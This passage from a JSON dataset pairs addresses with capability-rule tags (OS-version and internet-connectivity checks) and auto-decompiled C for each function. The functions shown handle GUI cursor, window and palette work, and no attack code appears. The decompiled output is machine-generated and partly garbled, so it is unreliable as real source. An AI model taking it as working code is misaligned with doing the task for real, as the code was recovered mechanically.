        "decompiled_code": "\nuint fcn.0044e308(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = *(*0x49ac84 + 8);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x1db) != '\\0')) && (*(iVar1 + 0x1ac) != 0)) &&\n       (iVar2 = fcn.00456f48(),  iVar2 != 0)) {\n        iVar2 = fcn.00456f48();\n        if ((iVar2 == 1) && (iVar2 = fcn.004198b4(),  iVar2 == *(*0x49ac84 + 0x40))) {\n            return 0;\n        }\n        iVar2 = fcn.0044eda8();\n        while( true ) {\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (iVar1 == iVar2) {\n                return 0;\n            }\n            iVar3 = fcn.00419910();\n            if (iVar3 != -1) break;\n            iVar2 = *(iVar2 + 0x30);\n        }\n        var_4h = fcn.00456f5c();\n    }\n    return var_4h;\n}\n",
        "token_count": 297
    },
    "0044e3a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e3a8(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    char cVar6;\n    int32_t *in_EAX;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    if (((*0x49aca0 == '\\0') &&\n        (uVar9 = *0x49ac90 - *in_EAX >> 0x1f,  (*0x49ac90 - *in_EAX ^ uVar9) - uVar9 < *0x49ac9c)) &&\n       (uVar9 = *0x49ac94 - in_EAX[1] >> 0x1f,  (*0x49ac94 - in_EAX[1] ^ uVar9) - uVar9 < *0x49ac9c)) {\n        return;\n    }\n    iVar10 = 0x44e403;\n    iVar7 = fcn.0044e27c(*0x49ac80);\n    if ((*0x49aca0 == '\\0') && (*0x49aca4 != 0)) {\n        iVar10 = *0x49ac94;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.0045a11c(iVar10);\n    }\n    if (*(*0x49ac80 + 0x8f) == '\\0') {\n        *0x49aca0 = '\\x01';\n    }\n    else {\n        *0x49aca0 = '\\x02';\n    }\n    if (iVar7 != (*0x49ac84)[2]) {\n        fcn.0044e2cc();\n        if (*0x49ac84 == NULL) {\n            return;\n        }\n        (*0x49ac84)[2] = iVar7;\n        (*0x49ac84)[3] = iVar10;\n        piVar1 = *0x49ac84;\n        (*0x49ac84)[4] = *in_EAX;\n        piVar1[5] = in_EAX[1];\n        fcn.0044e2cc();\n        if (*0x49ac84 == NULL) {\n            return;\n        }\n    }\n    piVar1 = *0x49ac84;\n    (*0x49ac84)[4] = *in_EAX;\n    piVar1[5] = in_EAX[1];\n    if ((*0x49ac84)[2] != 0) {\n        fcn.00450370();\n        piVar1 = *0x49ac84;\n        (*0x49ac84)[6] = iStack28;\n        piVar1[7] = iStack24;\n    }\n    fcn.0044e2cc(in_EAX[1]);\n    (**(**0x49ac84 + 4))();\n    if (*0x49aca4 != 0) {\n        if (((iVar7 == 0) || ((*(iVar7 + 0x51) & 0x20) != 0)) || (*(*0x49ac84 + 1) != '\\0')) {\n            fcn.0045a0f8();\n            if (*(*0x49aca4 + 0x6a) == '\\0') {\n                iVar10 = in_EAX[1];\n                sub.user32.dll_GetDesktopWindow();\n                fcn.0045a11c(iVar10);\n            }\n            else {\n                fcn.0045a218();\n            }\n        }\n        else {\n            fcn.0045a28c();\n            uVar8 = fcn.0044421c();\n            sub.user32.dll_SetCursor(uVar8);\n        }\n    }\n    cVar4 = fcn.0044421c();\n    sub.user32.dll_SetCursor();\n    if (*0x49aca0 == '\\x02') {\n        if (iVar7 == 0) {\n            fcn.0040484c(in_EAX[1]);\n        }\n        else {\n            iVar10 = fcn.0044e308();\n            (*0x49ac84)[0x18] = iVar10;\n            if (iVar10 == 0) {\n                uVar5 = fcn.0040484c();\n                *(*0x49ac84 + 0x17) = uVar5;\n            }\n            else {\n                fcn.00450370();\n                uVar5 = fcn.0040484c();\n                *(*0x49ac84 + 0x17) = uVar5;\n            }\n        }\n        if ((*0x49ac84 != NULL) && (cVar6 = fcn.0040995c(),  cVar6 == '\\0')) {\n            if ((cVar4 != '\\0') && (cVar4 = (**(**0x49ac84 + 0x3c))(),  cVar4 != '\\0')) {\n                (**(**0x49ac84 + 0x34))();\n            }\n            (**(**0x49ac84 + 0x30))();\n            piVar3 = *0x49ac84;\n            piVar2 = *0x49ac84 + 0x1a;\n            piVar1 = *0x49ac84 + 0x14;\n            (*0x49ac84)[0x19] = (*0x49ac84)[0x13];\n            *piVar2 = *piVar1;\n            piVar3[0x1b] = piVar3[0x15];\n            piVar3[0x1c] = piVar3[0x16];\n        }\n    }\n    return;\n}\n",
        "token_count": 1262
    },
    "0044e690": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e690(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    \n    *0x49ac84 = in_EAX;\n    in_EAX[2] = 0;\n    sub.user32.dll_GetCursorPos(0x49ac90);\n    piVar1 = *0x49ac84;\n    (*0x49ac84)[4] = *0x49ac90;\n    piVar1[5] = *0x49ac94;\n    *0x49ac98 = sub.user32.dll_GetCursor();\n    *0x49ac8c = fcn.0044d870();\n    *0x49ac9c = param_1;\n    cVar2 = fcn.004047dc();\n    if (cVar2 == '\\0') {\n        if (param_2 == '\\0') {\n            *0x49aca0 = '\\0';\n        }\n        else {\n            *0x49aca0 = '\\x01';\n        }\n    }\n    else {\n        iVar3 = in_EAX[0x13];\n        if (in_EAX[0x15] == iVar3 || in_EAX[0x15] - iVar3 < 0) {\n            in_EAX[10] = 0;\n            in_EAX[0xb] = 0;\n        }\n        else {\n            *(in_EAX + 10) = (in_EAX[4] - iVar3) / (in_EAX[0x15] - in_EAX[0x13]);\n        }\n        iVar3 = in_EAX[0x14];\n        if (in_EAX[0x16] == iVar3 || in_EAX[0x16] - iVar3 < 0) {\n            in_EAX[0xc] = 0;\n            in_EAX[0xd] = 0;\n        }\n        else {\n            *(in_EAX + 0xc) = (in_EAX[5] - iVar3) / (in_EAX[0x16] - in_EAX[0x14]);\n        }\n        if (param_2 == '\\0') {\n            *0x49aca0 = '\\0';\n        }\n        else {\n            *0x49aca0 = '\\x02';\n            (**(*in_EAX + 0x30))();\n        }\n    }\n    *0x49aca4 = (**(**0x49ac84 + 8))();\n    if (*0x49aca4 != 0) {\n        iVar3 = *0x49ac94;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.0045a11c(iVar3);\n    }\n    *0x49acac = fcn.00404620();\n    if (*0x49aca0 != '\\0') {\n        fcn.0044e3a8();\n    }\n    return;\n}\n",
        "token_count": 648
    },
    "0044e800": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e800(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpPoint;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x44e9a5;\n    iStack60 = *in_FS_OFFSET;\n    *0x49ac80 = in_EAX;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_8h = 0;\n    *0x49ac88 = 0;\n    if (*(in_EAX + 0x8f) == '\\0') {\n        puStack64 = 0x44e847;\n        puStack52 = &stack0xfffffffc;\n        fcn.0040484c();\n        if (*0x49ac80 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            puStack64 = 0x44e875;\n            var_8h = fcn.0044da94();\n            *0x49ac88 = 1;\n        }\n    }\n    else {\n        fcn.0040484c();\n        if (*0x49ac80 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            var_8h = fcn.0044dba4();\n            *0x49ac88 = 1;\n        }\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            if ((*(*(var_8h + 0x40) + 0x30) == 0) && (cVar1 = fcn.004047dc(),  cVar1 == '\\0')) {\n                puStack64 = &fcn.0044e800::lpPoint;\n                sub.user32.dll_GetCursorPos();\n                *(var_8h + 0x4c) = lpPoint;\n                *(var_8h + 0x50) = var_ch;\n            }\n            else {\n                fcn.00418428();\n                puStack64 = 0x44e946;\n                fcn.004502c0();\n                *(var_8h + 0x4c) = var_18h;\n                *(var_8h + 0x50) = var_14h;\n            }\n            fcn.00418428();\n            *(var_8h + 0x54) = var_18h;\n            *(var_8h + 0x58) = var_14h;\n        }\n        else {\n            puStack64 = var_8h + 0x4c;\n            uVar2 = fcn.00458594();\n            sub.user32.dll_GetWindowRect(uVar2);\n        }\n        *(var_8h + 100) = *(var_8h + 0x4c);\n        *(var_8h + 0x68) = *(var_8h + 0x50);\n        *(var_8h + 0x6c) = *(var_8h + 0x54);\n        *(var_8h + 0x70) = *(var_8h + 0x58);\n    }\n    fcn.0044e690();\n    *in_FS_OFFSET = puStack64;\n    return;\n}\n",
        "token_count": 819
    },
    "0044e9c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044e9c4(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *(*0x49ac84 + 8) != 0;\n    if ((*(arg_8h + -1) != '\\0') && (*0x49aca0 == '\\x02')) {\n        cVar1 = (**(**0x49ac80 + 0x54))();\n        if ((cVar1 == '\\0') && ((*0x49ac80)[0x25] != 0)) {\n            if ((*0x49ac80)[0x25] != 0) {\n                uVar2 = fcn.0040484c();\n            }\n        }\n        else {\n            uVar2 = CONCAT31((unaff_EBX & 0xffffff00) >> 8, 1);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 226
    },
    "0044ea38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044ea38(void)\n\n{\n    uint *puVar1;\n    char in_AL;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0044ea38::var_1h + 1;\n    puStack44 = &fcn.0044ea38::var_1h + 1;\n    piVar5 = NULL;\n    if ((*0x49ac84 == NULL) || (*(*0x49ac84 + 5) != '\\0')) {\n        return;\n    }\n    uStack36 = 0x44ed4d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    *0x49acb0 = *0x49ac84;\n    uStack48 = 0x44ecdb;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    *(*0x49ac84 + 5) = 1;\n    *(*0x49ac84 + 8) = in_AL;\n    var_1h._0_1_ = in_AL;\n    fcn.0044d8b8();\n    if (*0x49aca0 == '\\x02') {\n        piVar5 = fcn.00404800();\n        (**(*piVar5 + 0x34))();\n        *(piVar5 + 0x1d) = piVar5[2] == 0;\n    }\n    if ((*0x49ac84)[2] == 0) {\ncode_r0x0044eb10:\n        var_dh = (*0x49ac84)[5];\n    }\n    else {\n        cVar2 = fcn.004047dc();\n        if (cVar2 == '\\0') goto code_r0x0044eb10;\n        var_dh = (*0x49ac84)[7];\n    }\n    uStack60 = 0x44eb27;\n    cVar2 = fcn.0044e9c4(&fcn.0044ea38::var_1h + 1);\n    if (cVar2 != '\\0') {\n        if ((*0x49aca0 == '\\x02') && (*(piVar5 + 0x1d) != '\\0')) {\ncode_r0x0044eb4f:\n            if (var_1h != '\\0') {\n                uVar3 = 1;\n                goto code_r0x0044eb5b;\n            }\n        }\n        else if (*0x49aca0 != '\\0') {\n            cVar2 = fcn.0044e2cc();\n            if (cVar2 != '\\0') goto code_r0x0044eb4f;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0044eb5b:\n    if (*0x49aca0 == '\\x02') {\n        if ((uVar3 != 0) && (*(piVar5 + 0x1d) != '\\0')) {\n            iVar4 = fcn.0043bd2c();\n            if ((iVar4 != 0) && (*(iVar4 + 0x268) == piVar5[0x10])) {\n                fcn.00440a6c();\n            }\n            uStack60 = 0x44ebaa;\n            fcn.00451ae8(*0x49ac84);\n        }\n    }\n    else if (*0x49aca4 == 0) {\n        uStack60 = 0x44ebcc;\n        sub.user32.dll_SetCursor();\n    }\n    else {\n        fcn.0045a28c();\n    }\n    *0x49ac80 = 0;\n    *0x49ac84 = NULL;\n    if ((*0x49acb0 != NULL) && ((*0x49acb0)[2] != 0)) {\n        if (uVar3 == 0) {\n            (*0x49acb0)[4] = 0;\n            (*0x49acb0)[5] = 0;\n        }\n        puVar1 = *0x49acb0;\n        uStack60 = 0x44ec7f;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        arg_8h = *0x49acb0 + 4;\n        fcn.0044e198(arg_8h, (*0x49acb0)[2]);\n        *in_FS_OFFSET = arg_8h;\n        if (*0x49acb0 == NULL) {\n            *0x49acb0 = puVar1;\n        }\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x44ece2;\n    uStack48 = 0x44ec9d;\n    fcn.00404650();\n    *0x49acac = 0;\n    if (*0x49acb0 != NULL) {\n        *(*0x49acb0 + 5) = 0;\n        uStack48 = var_dh;\n        uStack52 = uVar3;\n        (****0x49acb0)();\n    }\n    *0x49ac84 = NULL;\n    return;\n}\n",
        "token_count": 1270
    },
    "0044ed5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ed5c(void)\n\n{\n    if (*0x49ac84 != 0) {\n        fcn.0044ea38();\n    }\n    *0x49ac80 = 0;\n    return;\n}\n",
        "token_count": 52
    },
    "0044edf4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044edf4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX == 0) {\n        iVar1 = fcn.00404620();\n        *in_EAX = iVar1;\n    }\n    fcn.0041975c();\n    return;\n}\n",
        "token_count": 76
    },
    "0044ee1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ee1c(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004199f8();\n    if (*(*in_EAX + 8) == 0) {\n        fcn.00404650();\n        *in_EAX = 0;\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0044ef28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ef28(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x44ef38;\n    var_8h = fcn.00419c24();\n    uStack24 = 0x44efc6;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x44ef63;\n            var_ch = fcn.004198b4();\n            puStack32 = 0x44ef6e;\n            cVar1 = fcn.00425558();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x44ef9e;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.0044f0a8();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x44efa5;\n                uStack36 = 0x44ef9d;\n                fcn.004255b4();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x44efcd;\n    uStack24 = 0x44efc5;\n    fcn.00419c88();\n    return;\n}\n",
        "token_count": 457
    },
    "0044f000": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044f000(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) == 0) {\n        puStack16 = 0x44f019;\n        fcn.00425744();\n    }\n    else {\n        if (*(in_EAX + 0x5c) == 0) {\n            puStack16 = 0x44f031;\n            iVar1 = fcn.00419c24();\n            uStack20 = 0x44f085;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            if (3 < *(iVar1 + 8)) {\n                puStack16 = &stack0xfffffffc;\n                fcn.0044ee6c();\n            }\n            uVar2 = (**(**(in_EAX + 0x58) + 0x48))();\n            *(in_EAX + 0x5c) = uVar2;\n            fcn.0041975c();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x44f08c;\n            uStack20 = 0x44f084;\n            fcn.00419c88();\n            return;\n        }\n        puStack16 = 0x44f09a;\n        fcn.00425748();\n        puStack16 = 0x44f0a2;\n        fcn.0044f0f4();\n    }\n    return;\n}\n",
        "token_count": 384
    },
    "0044f0a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044f0a8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) != 0) {\n        fcn.00425748();\n        fcn.00419c38();\n        sub.user32.dll_ReleaseDC(*(in_EAX + 0x60), *(in_EAX + 0x5c));\n        *(in_EAX + 0x5c) = 0;\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0044f260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044f260(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack48 = &fcn.0044f260::var_1h + 1;\n    var_8h = 0;\n    uStack52 = 0x44f32d;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_1h._0_1_ = 1;\n    arg_8h = 0x44f295;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        arg_8h = 0x44f2a7;\n        cVar1 = fcn.0040484c();\n        if ((((cVar1 != '\\0') && (*(**0x495b10 + 0x7c) != '\\0')) && (*(*(in_EAX + 0x10) + 0x84) != 0)) &&\n           (*param_2 != 0)) {\n            arg_8h = &fcn.0044f260::var_8h;\n            fcn.00433adc();\n            fcn.0040afa0(arg_8h);\n            fcn.00405584();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x44f334;\n    iStack56 = 0x44f324;\n    fcn.00405530();\n    iStack56 = 0x44f32c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 477
    },
    "0044f698": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0044f698(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff70();\n    in_EAX[0xf] = in_EAX;\n    in_EAX[0xe] = *(*in_EAX + 0x78);\n    in_EAX[0x14] = *0x44f788;\n    iVar1 = fcn.004244d4();\n    in_EAX[0x1a] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4508e0;\n    *(in_EAX + 0x61) = *0x44f78c;\n    iVar1 = fcn.0044f120();\n    in_EAX[0x1d] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x4518a4;\n    iVar1 = fcn.0045dc48();\n    in_EAX[0x1e] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x45337c;\n    in_EAX[0x1c] = -0xfffffb;\n    *(in_EAX + 0x57) = 1;\n    *(in_EAX + 0x16) = 1;\n    *(in_EAX + 0x59) = 1;\n    *(in_EAX + 0x5a) = 1;\n    *(in_EAX + 0x8e) = 1;\n    *(in_EAX + 0x18) = 1;\n    *(in_EAX + 0x5e) = 0;\n    *(in_EAX + 0x7e) = 0xfff4;\n    in_EAX[0x2b] = *0x43b170;\n    *(in_EAX + 0x56) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 587
    },
    "0044f89c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044f89c(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_stack_ffffffe8;\n    uint uStack20;\n    \n    uVar2 = 0;\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar1 = fcn.0040484c(in_stack_ffffffe8 & 0xffffff00 | param_2);\n        if (iVar1 != 0) {\n            uStack20 = (**(*in_EAX + 0x48))();\n            uVar2 = sub.gdi32.dll_SelectPalette();\n            iVar1 = sub.gdi32.dll_RealizePalette(uStack20);\n            if (iVar1 != 0) {\n                (**(*in_EAX + 0x80))();\n            }\n            sub.gdi32.dll_SelectPalette(uStack20, uVar2, 0xffffffff);\n            sub.user32.dll_ReleaseDC(uVar2);\n            uVar2 = 1;\n        }\n    }\n    return CONCAT44(uStack20, uVar2);\n}\n",
        "token_count": 254
    },
    "0044fac8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044fac8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 8;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x6c))();\n    }\n    fcn.004203e8();\n    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfff7;\n    if (in_EAX[0xc] != 0) {\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "0044ff90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ff90(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x94)) {\n        if ((*(in_EAX + 0x94) != 0) && (*(*(in_EAX + 0x94) + 0x1ac) != 0)) {\n            puStack40 = 0x44ffd5;\n            fcn.004199f8();\n            puStack40 = 0x44ffe6;\n            fcn.00420284();\n        }\n        if (((param_2 != 0) && (param_2 != -1)) && (*(param_2 + 0x1ac) != 0)) {\n            puStack40 = 0x450006;\n            fcn.0041975c();\n        }\n    }\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x400;\n    uStack44 = 0x4500b0;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    if (param_2 != -1) {\n        puStack40 = &stack0xfffffffc;\n        fcn.0040484c();\n    }\n    iVar1 = *(in_EAX + 0x94);\n    if (param_2 != iVar1) {\n        if (param_2 == -1) {\n            *(in_EAX + 0x94) = 0;\n        }\n        else {\n            *(in_EAX + 0x94) = param_2;\n            if (param_2 != 0) {\n                fcn.0040484c();\n                fcn.00420044();\n            }\n        }\n        if (iVar1 != 0) {\n            fcn.0040484c();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfbff;\n    return;\n}\n",
        "token_count": 526
    },
    "00450230": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
